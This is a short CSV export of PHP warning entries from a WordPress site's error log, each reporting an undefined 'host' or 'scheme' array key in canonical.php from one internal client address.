timestamp,classification,host.ip,message,process_id
Tue Oct 25 16:26:42.030910 2022,php:warn,"172.18.1.0, 172.17.0.2","[client 10.0.0.3:39978] PHP Warning:  Undefined array key ""host"" in /var/www/html/wp-includes/canonical.php on line 699",pid 550
Tue Oct 25 16:26:42.030921 2022,php:warn,"172.18.1.0, 172.17.0.2","[client 10.0.0.3:39978] PHP Warning:  Undefined array key ""scheme"" in /var/www/html/wp-includes/canonical.php on line 720",pid 550
Tue Oct 25 16:26:42.030958 2022,php:warn,"172.18.1.0, 172.17.0.2","[client 10.0.0.3:39978] PHP Warning:  Undefined array key ""host"" in /var/www/html/wp-includes/canonical.php on line 687",pid 550
Tue Oct 25 16:26:42.030962 2022,php:warn,"172.18.1.0, 172.17.0.2","[client 10.0.0.3:39978] PHP Warning:  Undefined array key ""host"" in /var/www/html/wp-includes/canonical.php on line 696",pid 550
Tue Oct 25 16:26:42.030964 2022,php:warn,"172.18.1.0, 172.17.0.2","[client 10.0.0.3:39978] PHP Warning:  Undefined array key ""host"" in /var/www/html/wp-includes/canonical.php on line 699",pid 550
Tue Oct 25 16:26:42.030966 2022,php:warn,"172.18.1.0, 172.17.0.2","[client 10.0.0.3:39978] PHP Warning:  Undefined array key ""scheme"" in /var/www/html/wp-includes/canonical.php on line 720",pid 550
Tue Oct 25 16:26:41.686688 2022,php:warn,"172.18.1.0, 172.17.0.2","[client 10.0.0.3:39974] PHP Warning:  Undefined array key ""host"" in /var/www/html/wp-includes/canonical.php on line 696",pid 64
Tue Oct 25 16:26:41.686693 2022,php:warn,"172.18.1.0, 172.17.0.2","[client 10.0.0.3:39974] PHP Warning:  Undefined array key ""host"" in /var/www/html/wp-includes/canonical.php on line 699",pid 64
Tue Oct 25 16:26:41.686697 2022,php:warn,"172.18.1.0, 172.17.0.2","[client 10.0.0.3:39974] PHP Warning:  Undefined array key ""scheme"" in /var/www/html/wp-includes/canonical.php on line 720",pid 64
Tue Oct 25 16:26:41.686755 2022,php:warn,"172.18.1.0, 172.17.0.2","[client 10.0.0.3:39974] PHP Warning:  Undefined array key ""host"" in /var/www/html/wp-includes/canonical.php on line 687",pid 64
Tue Oct 25 16:26:41.686760 2022,php:warn,"172.18.1.0, 172.17.0.2","[client 10.0.0.3:39974] PHP Warning:  Undefined array key ""host"" in /var/www/html/wp-includes/canonical.php on line 696",pid 64
Tue Oct 25 16:26:41.686763 2022,php:warn,"172.18.1.0, 172.17.0.2","[client 10.0.0.3:39974] PHP Warning:  Undefined array key ""host"" in /var/www/html/wp-includes/canonical.php on line 699",pid 64
